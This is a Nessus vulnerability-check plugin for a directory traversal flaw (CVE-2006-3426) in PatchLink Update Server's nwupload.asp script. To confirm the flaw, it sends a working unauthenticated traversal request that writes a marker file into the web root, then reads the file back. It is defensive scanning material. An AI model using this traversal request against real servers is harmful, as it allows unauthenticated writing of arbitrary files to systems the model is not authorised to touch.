#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains an ASP script that is affected by a
directory traversal flaw. 

Description :

The remote host is running PatchLink Update Server, a patch and
vulnerability management solution. 

The version of PatchLink Update Server installed on the remote fails
to sanitize input to the '/dagent/nwupload.asp' script of directory
traversal sequences and does not require authentication before
removing directories and writing to files as the user 'PLUS
ANONYMOUS'.  An unauthenticated attacker can leverage this flaw to
remove directories required by the application and write arbitrary
content to files on the affected host. 

Note that Novell ZENworks Patch Management is based on PatchLink
Update Server and is affected as well. 

See also :

http://www.securityfocus.com/archive/1/438710/30/0/threaded
http://support.novell.com/cgi-bin/search/searchtid.cgi?10100709.htm

Solution :

Apply patch 6.1 P1 / 6.2 SR1 P1 if using PatchLink Update Server or
6.2 SR1 P1 if using Novell ZENworks Patch Management. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description)
{
  script_id(22116);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-3426");
  script_bugtraq_id(18732);

  script_name(english:"PatchLink Update Server nwupload.asp Directory Traversal Vulnerability");
  script_summary(english:"Tries to write a file using PatchLink Update Server");
 
  script_description(english:desc);

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_asp(port:port)) exit(0);


# Where the file is written and its contents.
subdir = string("nessus-", unixtime());
fname = "nessus";
magic = string("Created by running the Nessus plugin ", SCRIPT_NAME, ".");


# Try to exploit the flaw.
req = http_get(
  item:string(
    "/dagent/nwupload.asp?",
    "action=../WebRoot/ErrorMessages/", subdir, "&",
    "agentid=", SCRIPT_NAME, "&",
    "index=", fname, "&",
    "data=", urlencode(str:magic)
  ),
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# Check whether our file exists.
url = string("/ErrorMessages/", subdir, "/", SCRIPT_NAME, "/", fname, ".txt");
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if our file contains the magic text.
if (magic >< res)
{
  url = str_replace(string:substr(url, 1), find:"/", replace:"\");
  report = string(
    desc,
    "\n\n",
    "Plugin output :\n",
    "\n",
    "Nessus was able to write to the file under the PLUS WebRoot :\n",
    "\n",
    "  ", url
  );
  security_note(port:port, data:report);
}
